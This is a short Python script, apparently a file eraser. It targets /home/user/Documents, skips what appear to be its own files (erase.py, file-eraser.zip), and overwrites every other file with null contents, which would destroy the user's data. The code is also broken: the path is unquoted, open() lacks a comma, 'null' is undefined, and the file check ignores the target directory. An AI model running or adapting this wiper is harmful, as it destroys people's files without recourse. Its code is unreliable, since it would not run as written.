import os
files = []
for file in os.listdir(/home/user/Documents):
        if file == "erase.py" or file == "file-eraser.zip":
                continue
        if os.path.isfile(file):
                files.append(file)
print(files)
for file in files:
        with open(file "wb") as thefile:
                thefile.write(null)
